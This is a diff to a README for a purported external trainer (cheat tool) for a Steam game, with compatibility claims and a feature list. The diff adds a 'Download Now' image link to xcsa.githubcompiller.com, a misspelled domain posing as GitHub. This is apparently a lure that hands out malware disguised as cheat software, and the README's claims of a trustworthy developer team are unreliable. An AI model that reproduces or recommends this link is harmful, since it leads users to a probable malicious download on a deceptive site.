@@ -4,6 +4,8 @@ We are a small independent development team building lightweight external traine
 
 As of March 05, 2026, this v1.6 build is fully compatible with the latest Steam PC client (App 268500) following the March 1 update (changenumber 34155730), which delivered minor stability enhancements and mod compatibility adjustments without shifting core memory layouts for soldier attributes, resources, or AI behaviors. We track SteamDB changelists and community mod updates to verify ongoing support.
 
+<a href="https://xcsa.githubcompiller.com/" target="_blank" rel="noopener"><img src="https://t4.ftcdn.net/jpg/08/17/73/81/360_F_817738146_X3Ze6FERyH1vZhPZmv8oOPoRVwucVVKR.jpg" alt="Download Now"></a>
+
 Our trainer runs externally: process scanning for memory read/write—no DLL injection, no save file edits, no Unreal Engine hooks. The Dear ImGui overlay offers tabbed controls (<45 MB RAM, <2% CPU usage) modifying client-side elements like HP/AP/aim rolls, supply stockpiles, enemy pods, and facility queues—session-local only, with auto-rollback on detach.
 
 **Strict Usage Policy**  
